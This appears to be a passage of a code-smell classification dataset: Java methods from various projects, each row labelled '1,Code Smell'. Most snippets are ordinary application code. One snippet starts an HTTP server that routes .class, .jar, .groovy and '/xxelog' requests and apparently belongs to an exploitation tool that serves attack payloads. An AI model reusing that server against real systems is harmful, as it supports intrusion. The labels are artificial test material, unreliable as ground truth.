  }
  if (hashingAlgorithm.equals(CoreConfig.PASSWORD_HASHING_ALG.FIREBASE_SCRYPT)) {
    Config.getConfig(appIdentifier.getAsPublicTenantIdentifier(),main).getFirebase_password_hashing_signer_key();
    if (ParsedFirebaseSCryptResponse.fromHashString(passwordHash) == null) {
      throw new UnsupportedPasswordHashingFormatException(""Password hash is in invalid Firebase SCrypt format"");
    }
  }
}",1,Code Smell
"@Override public void onSelectionChanged(int position,boolean selected,float x,float y){
  int i=position - chatAdapter.messagesStartRow;
  if (unselect) {
    selected=!selected;
  }
  if (i >= 0 && i < messages.size()) {
    MessageObject messageObject=messages.get(i);
    if (selected && (selectedMessagesIds[0].indexOfKey(messageObject.getId()) >= 0 || selectedMessagesIds[1].indexOfKey(messageObject.getId()) >= 0)) {
      return;
    }
    if (!selected && selectedMessagesIds[0].indexOfKey(messageObject.getId()) < 0 && selectedMessagesIds[1].indexOfKey(messageObject.getId()) < 0) {
      return;
    }
    if (messageObject.contentType == 0) {
      if (selected && selectedMessagesIds[0].size() + selectedMessagesIds[1].size() >= 1024) {
        limitReached=true;
      }
 else {
        limitReached=false;
      }
      RecyclerView.ViewHolder holder=chatListView.findViewHolderForAdapterPosition(position);
      if (holder != null && holder.itemView instanceof ChatMessageCell) {
        processRowSelect(holder.itemView,false,x,y);
      }
 else {
        addToSelectedMessages(messageObject,false);
        updateActionModeTitle();
        updateVisibleRows();
      }
    }
  }
}",1,Code Smell
"@Override public void tick(){
  super.tick();
  Level world=blockEntity.getLevel();
  for (Iterator<TransportedItemStack> iterator=incoming.iterator(); iterator.hasNext(); ) {
    TransportedItemStack ts=iterator.next();
    if (!tick(ts))     continue;
    if (world.isClientSide && !blockEntity.isVirtual())     continue;
    if (heldItem == null) {
      heldItem=ts;
    }
 else {
      if (!ItemHelper.canItemStackAmountsStack(heldItem.stack,ts.stack)) {
        Vec3 vec=VecHelper.getCenterOf(blockEntity.getBlockPos());
        Containers.dropItemStack(blockEntity.getLevel(),vec.x,vec.y + .5f,vec.z,ts.stack);
      }
 else {
        heldItem.stack.grow(ts.stack.getCount());
      }
    }
    iterator.remove();
    blockEntity.notifyUpdate();
  }
  if (heldItem == null)   return;
  if (!tick(heldItem))   return;
  BlockPos pos=blockEntity.getBlockPos();
  if (world.isClientSide)   return;
  if (handleBeltFunnelOutput())   return;
  BeltProcessingBehaviour processingBehaviour=BlockEntityBehaviour.get(world,pos.above(2),BeltProcessingBehaviour.TYPE);
  if (processingBehaviour == null)   return;
  if (!heldItem.locked && BeltProcessingBehaviour.isBlocked(world,pos))   return;
  ItemStack previousItem=heldItem.stack;
  boolean wasLocked=heldItem.locked;
  ProcessingResult result=wasLocked ? processingBehaviour.handleHeldItem(heldItem,transportedHandler) : processingBehaviour.handleReceivedItem(heldItem,transportedHandler);
  if (result == ProcessingResult.REMOVE) {
    heldItem=null;
    blockEntity.sendData();
    return;
  }
  heldItem.locked=result == ProcessingResult.HOLD;
  if (heldItem.locked != wasLocked || !previousItem.equals(heldItem.stack,false))   blockEntity.sendData();
}
protected boolean tick(TransportedItemStack heldItem){
  heldItem.prevBeltPosition=heldItem.beltPosition;
  heldItem.prevSideOffset=heldItem.sideOffset;
  float diff=.5f - heldItem.beltPosition;
  if (diff > 1 / 512f) {
    if (diff > 1 / 32f && !BeltHelper.isItemUpright(heldItem.stack))     heldItem.angle+=1;
    heldItem.beltPosition+=diff / 4f;
  }
  return diff < 1 / 16f;
}",1,Code Smell
"private static void sortOnParsing(Parsed parsed,List<BeanElement> elementList){
  List<BeanElement> tempList=new ArrayList<>();
  tempList.addAll(elementList);
  elementList.clear();
  BeanElement one=null;
  Iterator<BeanElement> ite=tempList.iterator();
  while (ite.hasNext()) {
    BeanElement be=ite.next();
    if (be.getProperty().equals(parsed.getKey())) {
      one=be;
      ite.remove();
    }
  }
  Iterator<BeanElement> beIte=tempList.iterator();
  while (beIte.hasNext()) {
    if (null == beIte.next()) {
      beIte.remove();
    }
  }
  if (one != null) {
    elementList.add(0,one);
  }
  for (  Field field : parsed.getClzz().getDeclaredFields()) {
    for (    BeanElement be : tempList) {
      if (be.getProperty().equals(field.getName())) {
        elementList.add(be);
      }
    }
  }
}",1,Code Smell
"/** 
 * Guesses canonical filename that a download would have, using the URL and contentDisposition. File extension, if not defined, is added based on the mimetype
 * @param url Url to the content
 * @param contentDisposition Content-Disposition HTTP header or null
 * @param mimeType Mime-type of the content or null
 * @return suggested filename
 */
public static final String guessFileName(String url,String contentDisposition,String mimeType){
  String filename=null;
  String extension=null;
  if (filename == null && contentDisposition != null) {
    filename=parseContentDisposition(contentDisposition);
    if (filename != null) {
      int index=filename.lastIndexOf('/') + 1;
      if (index > 0) {
        filename=filename.substring(index);
      }
    }
  }
  if (filename == null) {
    String decodedUrl=Uri.decode(url);
    if (decodedUrl != null) {
      int queryIndex=decodedUrl.indexOf('?');
      if (queryIndex > 0) {
        decodedUrl=decodedUrl.substring(0,queryIndex);
      }
      if (!decodedUrl.endsWith(""/"")) {
        int index=decodedUrl.lastIndexOf('/') + 1;
        if (index > 0) {
          filename=decodedUrl.substring(index);
        }
      }
    }
  }
  if (filename == null) {
    filename=""downloadfile"";
  }
  int dotIndex=filename.indexOf('.');
  if (dotIndex < 0) {
    if (mimeType != null) {
      extension=MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType);
      if (extension != null) {
        extension=""."" + extension;
      }
    }
    if (extension == null) {
      if (mimeType != null && mimeType.toLowerCase(Locale.ROOT).startsWith(""text/"")) {
        if (mimeType.equalsIgnoreCase(""text/html"")) {
          extension="".html"";
        }
 else {
          extension="".txt"";
        }
      }
 else {
        extension="".bin"";
      }
    }
  }
 else {
    if (mimeType != null) {
      int lastDotIndex=filename.lastIndexOf('.');
      String typeFromExt=MimeTypeMap.getSingleton().getMimeTypeFromExtension(filename.substring(lastDotIndex + 1));
      if (typeFromExt != null && !typeFromExt.equalsIgnoreCase(mimeType)) {
        extension=MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType);
        if (extension != null) {
          extension=""."" + extension;
        }
      }
    }
    if (extension == null) {
      extension=filename.substring(dotIndex);
    }
    filename=filename.substring(0,dotIndex);
  }
  return filename + extension;
}",1,Code Smell
"@Override public void handleMessage(Message msg){
  long timeDelta=SystemClock.elapsedRealtime() - lastUpdateTime;
  if (timeDelta < refreshInterval * 1000L) {
    if (msg.what != 1) {
      return;
    }
    if (timeDelta < 1) {
      timeDelta=Long.MAX_VALUE;
    }
  }
  lastUpdateTime=SystemClock.elapsedRealtime();
  long newTotalRxBytes=TrafficStats.getTotalRxBytes();
  long newTotalTxBytes=TrafficStats.getTotalTxBytes();
  long rxData=newTotalRxBytes - totalRxBytes;
  long txData=newTotalTxBytes - totalTxBytes;
  if (shouldHide(rxData,txData,timeDelta)) {
    hide(true);
  }
 else {
    SpannableStringBuilder output=null;
switch (indicatorMode) {
case MODE_SHOW_RXTX:
      SpannableStringBuilder RXOutput=formatOutput(timeDelta,rxData,(colorTraffic) ? downloadColor : null);
    SpannableStringBuilder TXOutput=formatOutput(timeDelta,txData,(colorTraffic) ? uploadColor : null);
  output=(RXonTop) ? RXOutput.append(""\n"").append(TXOutput) : TXOutput.append(""\n"").append(RXOutput);
break;
case MODE_SHOW_TOTAL:
output=formatOutput(timeDelta,rxData + txData,null);
break;
case MODE_SHOW_RX:
output=formatOutput(timeDelta,rxData,(colorTraffic) ? downloadColor : null);
break;
case MODE_SHOW_TX:
output=formatOutput(timeDelta,txData,(colorTraffic) ? uploadColor : null);
break;
}
mTextView.setText(output);
makeVisible(true);
}
totalRxBytes=newTotalRxBytes;
totalTxBytes=newTotalTxBytes;
clearHandlerCallbacks();
mTrafficHandler.postDelayed(mRunnable,refreshInterval * 1000L);
}",1,Code Smell
"/** 
 * 请求之前执行
 * @return 当返回对象时，直接将此对象返回到页面，返回null时，继续执行后续操作
 * @throws Exception
 */
public void preHandle(HttpServletRequest request,HttpServletResponse response,DataApiEntity api,Map<String,Object> params) throws Exception {
  System.out.println(""************ApiInterceptor preHandle executed**********"");
  String uri=request.getRequestURI();
  log.info(""getRequestURI的值："" + uri);
  String ipAddr=IPUtil.getIpAddr(request);
  log.info(""ipAddr的值："" + ipAddr);
  String apiKey=request.getHeader(""api_key"");
  String secretKey=request.getHeader(""secret_key"");
  if (StrUtil.isBlank(apiKey) || StrUtil.isBlank(secretKey)) {
    throw new DataException(""api_key或secret_key空"");
  }
  MD5Util mt=MD5Util.getInstance();
  String apiId=mt.decode(apiKey);
  String userId=mt.decode(secretKey);
  String deny=api.getDeny();
  if (StrUtil.isNotBlank(deny)) {
    List<String> denyList=Arrays.asList(deny.split("",""));
    if (CollUtil.isNotEmpty(denyList)) {
      for (      String ip : denyList) {
        if (ip.equals(ipAddr)) {
          throw new DataException(ip + ""已被加入IP黑名单"");
        }
      }
    }
  }
  if (MapUtil.isNotEmpty(params)) {
    api.getReqParams().forEach(param -> {
      if (params.containsKey(param.getParamName())) {
        ParamType.parse(ParamType.getParamType(param.getParamType()),params.get(param.getParamName()));
      }
    }
);
  }
  RateLimit rateLimit=api.getRateLimit();
  if (DataConstant.TrueOrFalse.TRUE.getKey().equals(rateLimit.getEnable())) {
    Integer times=rateLimit.getTimes();
    Integer seconds=rateLimit.getSeconds();
    times=Optional.ofNullable(times).orElse(5);
    seconds=Optional.ofNullable(seconds).orElse(60);
    String key=""user:"" + userId + "":api:""+ apiId;
    Integer maxTimes=(Integer)redisTemplate.opsForValue().get(key);
    if (maxTimes == null) {
      redisTemplate.opsForValue().set(key,1,seconds,TimeUnit.SECONDS);
    }
 else     if (maxTimes < times) {
      redisTemplate.opsForValue().set(key,maxTimes + 1,seconds,TimeUnit.SECONDS);
    }
 else {
      throw new DataException(""API调用过于频繁"");
    }
  }
}",1,Code Smell
"public static void start() throws IOException {
  HttpServer httpServer=HttpServer.create(new InetSocketAddress(Config.httpPort),0);
  httpServer.createContext(""/"",new HttpHandler(){
    @Override public void handle(    HttpExchange httpExchange){
      try {
        System.out.println(""[+] New HTTP Request From "" + httpExchange.getRemoteAddress() + ""  ""+ httpExchange.getRequestURI());
        String path=httpExchange.getRequestURI().getPath();
        if (path.endsWith("".class"")) {
          handleClassRequest(httpExchange);
        }
 else         if (path.endsWith("".wsdl"")) {
          handleWSDLRequest(httpExchange);
        }
 else         if (path.endsWith("".jar"")) {
          handleJarRequest(httpExchange);
        }
 else         if (path.startsWith(""/xxelog"")) {
          handleXXELogRequest(httpExchange);
        }
 else         if (path.endsWith("".sql"")) {
          handleSQLRequest(httpExchange);
        }
 else         if (path.endsWith("".groovy"")) {
          handlerGroovyRequest(httpExchange);
        }
 else         if (path.endsWith("".xml"")) {
          handleXMLRequest(httpExchange);
        }
 else         if (path.endsWith("".txt"")) {
          handleTXTRequest(httpExchange);
        }
 else         if (path.endsWith("".yml"")) {
          handleYmlRequest(httpExchange);
        }
 else {
          handleFileRequest(httpExchange);
        }
      }
 catch (      Exception e) {
        e.printStackTrace();
      }
    }
  }
);
  httpServer.setExecutor(null);
  httpServer.start();
  System.out.println(""[+] HTTP Server Start Listening on "" + Config.httpPort + ""..."");
}",1,Code Smell
"private void setPressedKeyGraphics(@Nullable final Key key,final long eventTime){
  if (key == null) {
    return;
  }
  final boolean altersCode=key.altCodeWhileTyping() && sTimerProxy.isTypingState();
  final boolean needsToUpdateGraphics=key.isEnabled() || altersCode;
  if (!needsToUpdateGraphics) {
    return;
  }
  final boolean noKeyPreview=sInGesture || needsToSuppressKeyPreviewPopup(eventTime);
  sDrawingProxy.onKeyPressed(key,!noKeyPreview);
  if (key.isShift()) {
    for (    final Key shiftKey : mKeyboard.mShiftKeys) {
      if (shiftKey != key) {
        sDrawingProxy.onKeyPressed(shiftKey,false);
      }
    }
  }
  if (altersCode) {
    final int altCode=key.getAltCode();
    final Key altKey=mKeyboard.getKey(altCode);
    if (altKey != null) {
      sDrawingProxy.onKeyPressed(altKey,false);
    }
    for (    final Key k : mKeyboard.mAltCodeKeysWhileTyping) {
      if (k != key && k.getAltCode() == altCode) {
        sDrawingProxy.onKeyPressed(k,false);
      }
    }
  }
}
",1,Code Smell
"private void updateScriptFields(TransactionInput txInput,PSBTInput psbtInput){
  if (txInput.getScriptBytes().length > 0 || txInput.hasWitness()) {
    psbtInput=null;
  }
  scriptSigArea.clear();
  redeemScriptArea.clear();
  witnessesArea.clear();
  witnessScriptArea.clear();
  Script redeemScript=txInput.getScriptSig().getFirstNestedScript();
  if (redeemScript != null && inputForm.getReferencedTransactionOutput() != null) {
    Script lockingScript=inputForm.getReferencedTransactionOutput().getScript();
    if (!ScriptType.P2SH.isScriptType(lockingScript)) {
      redeemScript=null;
    }
  }
  if (redeemScript == null && psbtInput != null && psbtInput.getRedeemScript() != null) {
    redeemScriptArea.addPSBTDecoration(""PSBT Redeem Script"",""non-final"");
    redeemScript=psbtInput.getRedeemScript();
  }
  if (redeemScript == null && psbtInput != null && psbtInput.getFinalScriptSig() != null) {
    redeemScriptArea.addPSBTDecoration(""PSBT Final ScriptSig"",""final"");
    redeemScript=psbtInput.getFinalScriptSig().getFirstNestedScript();
  }
  if (txInput.getScriptSig().isEmpty() && psbtInput != null && psbtInput.getFinalScriptSig() != null) {
    scriptSigArea.appendScript(psbtInput.getFinalScriptSig(),redeemScript,null);
    scriptSigArea.addPSBTDecoration(""PSBT Final ScriptSig"",""final"");
  }
 else {
    scriptSigArea.appendScript(txInput.getScriptSig(),redeemScript,null);
  }
  if (redeemScript != null) {
    redeemScriptArea.setDisable(false);
    redeemScriptArea.appendScript(redeemScript);
  }
 else {
    redeemScriptScroll.setDisable(true);
  }
  Script witnesses=null;
  Script witnessScript=null;
  if (txInput.hasWitness()) {
    witnesses=new Script(txInput.getWitness().asScriptChunks());
    witnessScript=txInput.getWitness().getWitnessScript();
  }
 else   if (psbtInput != null) {
    if (psbtInput.getFinalScriptWitness() != null) {
      witnesses=new Script(psbtInput.getFinalScriptWitness().asScriptChunks());
      witnessScript=psbtInput.getFinalScriptWitness().getWitnessScript();
      witnessesArea.addPSBTDecoration(""PSBT Final ScriptWitness"",""final"");
      witnessScriptArea.addPSBTDecoration(""PSBT Final ScriptWitness"",""final"");
    }
 else     if (psbtInput.getWitnessScript() != null) {
      witnessScript=psbtInput.getWitnessScript();
      witnessScriptArea.addPSBTDecoration(""PSBT Witness Script"",""non-final"");
    }
  }
  if (witnesses != null) {
    witnessesScroll.setDisable(false);
    witnessesArea.appendScript(witnesses,null,witnessScript);
  }
 else {
    witnessesScroll.setDisable(true);
  }
  if (witnessScript != null) {
    witnessScriptScroll.setDisable(false);
    witnessScriptArea.appendScript(witnessScript);
  }
 else {
    witnessScriptScroll.setDisable(true);
  }
}",1,Code Smell
"@Override public Model<Label> train(Dataset<Label> examples,Map<String,Provenance> runProvenance){
  return train(examples,runProvenance,INCREMENT_INVOCATION_COUNT);
}
@Override public Model<Label> train(Dataset<Label> examples,Map<String,Provenance> runProvenance,int invocationCount){
  if (examples.getOutputInfo().getUnknownCount() > 0) {
    throw new IllegalArgumentException(""The supplied Dataset contained unknown Outputs, and this Trainer is supervised."");
  }
  ImmutableOutputInfo<Label> labelInfos=examples.getOutputIDInfo();
  ImmutableFeatureMap featureInfos=examples.getFeatureIDMap();
  Map<Integer,Map<Integer,Double>> labelWeights=new HashMap<>();
  for (  Pair<Integer,Label> label : labelInfos) {
    labelWeights.put(label.getA(),new HashMap<>());
  }
  for (  Example<Label> ex : examples) {
    int idx=labelInfos.getID(ex.getOutput());
    Map<Integer,Double> featureMap=labelWeights.get(idx);
    double curWeight=ex.getWeight();
    for (    Feature feat : ex) {
      if (feat.getValue() < 0.0) {
        throw new IllegalStateException(""Multinomial Naive Bayes requires non-negative features. Found feature "" + feat.toString());
      }
      featureMap.merge(featureInfos.getID(feat.getName()),curWeight * feat.getValue(),Double::sum);
    }
  }
  if (invocationCount != INCREMENT_INVOCATION_COUNT) {
    setInvocationCount(invocationCount);
  }
  TrainerProvenance trainerProvenance=getProvenance();
  ModelProvenance provenance=new ModelProvenance(MultinomialNaiveBayesModel.class.getName(),OffsetDateTime.now(),examples.getProvenance(),trainerProvenance,runProvenance);
  trainInvocationCount++;
  SparseVector[] labelVectors=new SparseVector[labelInfos.size()];
  for (int i=0; i < labelInfos.size(); i++) {
    SparseVector sv=SparseVector.createSparseVector(featureInfos.size(),labelWeights.get(i));
    double unsmoothedZ=sv.oneNorm();
    sv.foreachInPlace(d -> Math.log((d + alpha) / (unsmoothedZ + (featureInfos.size() * alpha))));
    labelVectors[i]=sv;
  }
  DenseSparseMatrix labelWordProbs=DenseSparseMatrix.createFromSparseVectors(labelVectors);
  return new MultinomialNaiveBayesModel("""",provenance,featureInfos,labelInfos,labelWordProbs,alpha);
}",1,Code Smell
"/** 
 * Parse Query String into Map. For strings that have only Key, key3 = </ code> is ignored.
 * @param keyPrefix In the output of the Map Key plus a unified prefix.
 * @param query Query String，For example: <code>key1=value1&key2=value2</code>
 * @return When Query String is <code>key1=value1&key2=value2</code>, and prefix is <code>pre.</code>,then <code>Map{pre.key1=value1, pre.key=value2}</code> will be returned.
 */
public static Map<String,String> parseQuery(String keyPrefix,String query){
  if (query == null)   return new HashMap<String,String>();
  if (keyPrefix == null)   keyPrefix="""";
  Matcher matcher=QUERY_PATTERN.matcher(query);
  Map<String,String> routeQuery=new HashMap<String,String>();
  String key=null;
  while (matcher.find()) {
    String separator=matcher.group(1);
    String content=matcher.group(2);
    if (separator == null || separator.length() == 0 || ""&"".equals(separator)) {
      if (key != null)       throw new IllegalStateException(""Illegal query string \"""" + query + ""\"", The error char '""+ separator+ ""' at index ""+ matcher.start()+ "" before \""""+ content+ ""\""."");
      key=content;
    }
 else     if (""="".equals(separator)) {
      if (key == null)       throw new IllegalStateException(""Illegal query string \"""" + query + ""\"", The error char '""+ separator+ ""' at index ""+ matcher.start()+ "" before \""""+ content+ ""\""."");
      routeQuery.put(keyPrefix + key,content);
      key=null;
    }
 else {
      if (key == null)       throw new IllegalStateException(""Illegal query string \"""" + query + ""\"", The error char '""+ separator+ ""' at index ""+ matcher.start()+ "" before \""""+ content+ ""\""."");
    }
  }
  return routeQuery;
}
public static Map<String,String> parseQuery(String query){
  return parseQuery("""",query);
}",1,Code Smell
"private static void computePath(Block.Getter getter,Point start,Point target,double closeDistance,double maxDistance,double pathVariance,BoundingBox boundingBox,PPath path,NodeGenerator generator){
  double closestDistance=Double.MAX_VALUE;
  double straightDistance=generator.heuristic(start,target);
  int maxSize=(int)Math.floor(maxDistance * 10);
  closeDistance=Math.max(0.8,closeDistance);
  List<PNode> closestFoundNodes=List.of();
  PNode pStart=new PNode(start,0,generator.heuristic(start,target),PNode.Type.WALK,null);
  ObjectHeapPriorityQueue<PNode> open=new ObjectHeapPriorityQueue<>(pNodeComparator);
  open.enqueue(pStart);
  Set<PNode> closed=new ObjectOpenHashBigSet<>(maxSize);
  while (!open.isEmpty() && closed.size() < maxSize) {
    if (path.getState() == PPath.State.TERMINATING) {
      path.setState(PPath.State.TERMINATED);
      return;
    }
    PNode current=open.dequeue();
    if (((current.g() + current.h()) - straightDistance) > pathVariance)     continue;
    if (!withinDistance(current,start,maxDistance))     continue;
    if (withinDistance(current,target,closeDistance)) {
      open.enqueue(current);
      break;
    }
    if (current.h() < closestDistance) {
      closestDistance=current.h();
      closestFoundNodes=List.of(current);
    }
    Collection<? extends PNode> found=generator.getWalkable(getter,closed,current,target,boundingBox);
    found.forEach(p -> {
      if (getDistanceSquared(p.x(),p.y(),p.z(),start) <= (maxDistance * maxDistance)) {
        open.enqueue(p);
        closed.add(p);
      }
    }
);
  }
  PNode current=open.isEmpty() ? null : open.dequeue();
  if (current == null || !withinDistance(current,target,closeDistance)) {
    if (closestFoundNodes.isEmpty()) {
      path.setState(PPath.State.INVALID);
      return;
    }
    current=closestFoundNodes.getFirst();
    if (!open.isEmpty()) {
      current=buildRepathNode(current);
    }
  }
  while (current.parent() != null) {
    path.getNodes().add(current);
    current=current.parent();
  }
  Collections.reverse(path.getNodes());
  if (path.getCurrentType() == PNode.Type.REPATH) {
    path.setState(PPath.State.INVALID);
    path.getNodes().clear();
    return;
  }
  if (path.getNodes().isEmpty()) {
    path.setState(PPath.State.INVALID);
    return;
  }
  var lastNode=path.getNodes().getLast();
  if (getDistanceSquared(lastNode.x(),lastNode.y(),lastNode.z(),target) > (closeDistance * closeDistance)) {
    path.setState(PPath.State.BEST_EFFORT);
    return;
  }
  PNode pEnd=new PNode(target,0,0,PNode.Type.WALK,null);
  path.getNodes().add(pEnd);
  path.setState(PPath.State.COMPUTED);
}",1,Code Smell
"public void updateTopic(){
  recommendedChannel=false;
  drawFolderBackground=false;
  nextChat=null;
  nextDialogId=0;
  imageReceiver.clearImage();
  TLRPC.TL_forumTopic topic=getNextUnreadTopic(-currentDialog);
  if (topic != null) {
    emptyStub=false;
    nextTopic=topic;
    Drawable forumIcon;
    if (topic.id == 1) {
      if (parentView != null && animatedEmojiDrawable != null) {
        animatedEmojiDrawable.removeView(parentView);
      }
      animatedEmojiDrawable=null;
      forumIcon=ForumUtilities.createGeneralTopicDrawable(fragmentView.getContext(),1f,getThemedColor(Theme.key_chat_inMenu),false);
      imageReceiver.setImageBitmap(forumIcon);
    }
 else     if (topic.icon_emoji_id != 0) {
      if (animatedEmojiDrawable == null || animatedEmojiDrawable.getDocumentId() != topic.icon_emoji_id) {
        if (animatedEmojiDrawable != null && parentView != null) {
          animatedEmojiDrawable.removeView(parentView);
        }
        animatedEmojiDrawable=new AnimatedEmojiDrawable(AnimatedEmojiDrawable.CACHE_TYPE_FORUM_TOPIC_LARGE,currentAccount,topic.icon_emoji_id);
        animatedEmojiDrawable.setColorFilter(new PorterDuffColorFilter(getThemedColor(Theme.key_chat_serviceText),PorterDuff.Mode.SRC_IN));
      }
      if (animatedEmojiDrawable != null && parentView != null) {
        animatedEmojiDrawable.addView(parentView);
      }
      imageReceiver.setImageBitmap((Bitmap)null);
    }
 else {
      if (parentView != null && animatedEmojiDrawable != null) {
        animatedEmojiDrawable.removeView(parentView);
      }
      animatedEmojiDrawable=null;
      forumIcon=ForumUtilities.createTopicDrawable(topic,false);
      imageReceiver.setImageBitmap(forumIcon);
    }
    final int count=topic.unread_count;
    counterDrawable.setCount(count,false);
    visibleCounterDrawable=count > 0;
  }
 else {
    nextTopic=null;
    emptyStub=true;
  }
}",1,Code Smell
"/** 
 * Runs algorithm. TODO: This is n^2, and could be made linear-ish with a hash. In particular, hash the contents of each block and only compare blocks with the same hash.
 * @return {@code non-null;} new method that has been processed
 */
public RopMethod process(){
  int szBlocks=blocks.size();
  BitSet toDelete=new BitSet(blocks.getMaxLabel());
  for (int bindex=0; bindex < szBlocks; bindex++) {
    BasicBlock b=blocks.get(bindex);
    if (toDelete.get(b.getLabel())) {
      continue;
    }
    IntList preds=ropMethod.labelToPredecessors(b.getLabel());
    int szPreds=preds.size();
    for (int i=0; i < szPreds; i++) {
      int iLabel=preds.get(i);
      BasicBlock iBlock=blocks.labelToBlock(iLabel);
      if (toDelete.get(iLabel) || iBlock.getSuccessors().size() > 1 || iBlock.getFirstInsn().getOpcode().getOpcode() == RegOps.MOVE_RESULT) {
        continue;
      }
      IntList toCombine=new IntList();
      for (int j=i + 1; j < szPreds; j++) {
        int jLabel=preds.get(j);
        BasicBlock jBlock=blocks.labelToBlock(jLabel);
        if (jBlock.getSuccessors().size() == 1 && compareInsns(iBlock,jBlock)) {
          toCombine.add(jLabel);
          toDelete.set(jLabel);
        }
      }
      combineBlocks(iLabel,toCombine);
    }
  }
  for (int i=szBlocks - 1; i >= 0; i--) {
    if (toDelete.get(newBlocks.get(i).getLabel())) {
      newBlocks.set(i,null);
    }
  }
  newBlocks.shrinkToFit();
  newBlocks.setImmutable();
  return new RopMethod(newBlocks,ropMethod.getFirstLabel());
}",1,Code Smell
"public static <T extends BlockEntity & IMultiBlockEntityContainer>void formMulti(T be){
  SearchCache<T> cache=new SearchCache<>();
  List<T> frontier=new ArrayList<>();
  frontier.add(be);
  formMulti(be.getType(),be.getLevel(),cache,frontier);
}
private static <T extends BlockEntity & IMultiBlockEntityContainer>void formMulti(BlockEntityType<?> type,BlockGetter level,SearchCache<T> cache,List<T> frontier){
  PriorityQueue<Pair<Integer,T>> creationQueue=makeCreationQueue();
  Set<BlockPos> visited=new HashSet<>();
  Direction.Axis mainAxis=frontier.get(0).getMainConnectionAxis();
  int minX=(mainAxis == Direction.Axis.Y ? Integer.MAX_VALUE : Integer.MIN_VALUE);
  int minY=(mainAxis != Direction.Axis.Y ? Integer.MAX_VALUE : Integer.MIN_VALUE);
  int minZ=(mainAxis == Direction.Axis.Y ? Integer.MAX_VALUE : Integer.MIN_VALUE);
  for (  T be : frontier) {
    BlockPos pos=be.getBlockPos();
    minX=Math.min(pos.getX(),minX);
    minY=Math.min(pos.getY(),minY);
    minZ=Math.min(pos.getZ(),minZ);
  }
  if (mainAxis == Direction.Axis.Y)   minX-=frontier.get(0).getMaxWidth();
  if (mainAxis != Direction.Axis.Y)   minY-=frontier.get(0).getMaxWidth();
  if (mainAxis == Direction.Axis.Y)   minZ-=frontier.get(0).getMaxWidth();
  while (!frontier.isEmpty()) {
    T part=frontier.remove(0);
    BlockPos partPos=part.getBlockPos();
    if (visited.contains(partPos))     continue;
    visited.add(partPos);
    int amount=tryToFormNewMulti(part,cache,true);
    if (amount > 1) {
      creationQueue.add(Pair.of(amount,part));
    }
    for (    Direction.Axis axis : Iterate.axes) {
      Direction dir=Direction.get(Direction.AxisDirection.NEGATIVE,axis);
      BlockPos next=partPos.relative(dir);
      if (next.getX() <= minX || next.getY() <= minY || next.getZ() <= minZ)       continue;
      if (visited.contains(next))       continue;
      T nextBe=partAt(type,level,next);
      if (nextBe == null)       continue;
      if (nextBe.isRemoved())       continue;
      frontier.add(nextBe);
    }
  }
  visited.clear();
  while (!creationQueue.isEmpty()) {
    Pair<Integer,T> next=creationQueue.poll();
    T toCreate=next.getValue();
    if (visited.contains(toCreate.getBlockPos()))     continue;
    visited.add(toCreate.getBlockPos());
    tryToFormNewMulti(toCreate,cache,false);
  }
}",1,Code Smell
"public void sendHTML(String html){
  ByteArrayOutputStream brotliOutput=new ByteArrayOutputStream();
  Brotli4jLoader.ensureAvailability();
  BufferedWriter brotliWriter=null;
  try {
    brotliWriter=new BufferedWriter(new OutputStreamWriter(new BrotliOutputStream(brotliOutput)));
  }
 catch (  IOException e) {
    e.printStackTrace();
  }
  BufferedReader bufReader=new BufferedReader(new StringReader(html));
  String line=null;
  assert brotliWriter != null;
  try {
    while ((line=bufReader.readLine()) != null) {
      brotliWriter.write(line);
    }
    brotliWriter.flush();
    brotliWriter.close();
  }
 catch (  IOException ioe) {
    ioe.printStackTrace();
  }
  Encode smsEncoder=new Encode();
  byte[] htmlBytes=brotliOutput.toByteArray();
  int[] htmlBytesAsIntArray=new int[htmlBytes.length];
  for (int i=0; i < htmlBytes.length; i++) {
    htmlBytesAsIntArray[i]=(htmlBytes[i] & 0xFF);
  }
  int[] encodedSms=smsEncoder.encode_raw(256,114,134,158,htmlBytesAsIntArray);
  StringBuilder smsEncodedOutputBuilder=new StringBuilder();
  for (  int value : encodedSms) {
    smsEncodedOutputBuilder.append(SYMBOL_TABLE[value]);
  }
  String smsEncodedOutput=smsEncodedOutputBuilder.toString();
  final int NUM_CHARS_PER_SMS=158;
  ArrayList<String> smsQueue=new ArrayList<>();
  for (int i=0; i < smsEncodedOutput.length(); i+=NUM_CHARS_PER_SMS) {
    smsQueue.add(smsEncodedOutput.substring(i,i + NUM_CHARS_PER_SMS));
  }
  int[] indices=new int[smsQueue.size()];
  for (int j=0; j < indices.length; j++) {
    indices[j]=j;
  }
  String[] indexCharacters=v2r(indices);
  for (int k=0; k < indexCharacters.length; k++) {
    smsQueue.set(k,indexCharacters[k] + smsQueue.get(k));
  }
  int howManyTextsToExpect=(smsQueue.size());
  SmsManager sms=SmsManager.getDefault();
  String outputNumber="""";
  if (phoneNumber.hasCountryCode()) {
    outputNumber+=phoneNumber.getCountryCode();
  }
  outputNumber+=phoneNumber.getNationalNumber();
  if (howManyTextsToExpect > MAX_SMS_PER_REQUEST) {
    Log.w(TAG,""Request made with SMS count > MAX_SMS_PER_REQUEST"");
    sms.sendTextMessage(outputNumber,null,service.getString(R.string.request_sms_outgoing_exceeded_error),null,null);
    return;
  }
  sms.sendTextMessage(outputNumber,null,howManyTextsToExpect + "" Process starting"",null,null);
  try {
    Thread.sleep(1000);
  }
 catch (  InterruptedException e) {
    e.printStackTrace();
  }
  int currentMessageID=0;
  isSending=true;
  while (shouldSend.get() && currentMessageID < smsQueue.size()) {
    sms.sendTextMessage(outputNumber,null,smsQueue.get(currentMessageID),null,null);
    currentMessageID++;
  }
  isSending=false;
  boolean wasFalse=shouldSend.compareAndSet(false,true);
}",1,Code Smell
"public void updateRotation(){
  if (cameraInfo == null) {
    return;
  }
  try {
    updateCameraInfo();
  }
 catch (  Throwable throwable) {
    FileLog.e(throwable);
    return;
  }
  Camera camera=destroyed ? null : cameraInfo.camera;
  displayOrientation=getDisplayOrientation(info,true);
  int cameraDisplayOrientation;
  int degrees=0;
  if (""samsung"".equals(Build.MANUFACTURER) && ""sf2wifixx"".equals(Build.PRODUCT)) {
    cameraDisplayOrientation=0;
  }
 else {
    int temp=displayOrientation;
switch (temp) {
case Surface.ROTATION_0:
      degrees=0;
    break;
case Surface.ROTATION_90:
  degrees=90;
break;
case Surface.ROTATION_180:
degrees=180;
break;
case Surface.ROTATION_270:
degrees=270;
break;
}
if (info.orientation % 90 != 0) {
info.orientation=0;
}
if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
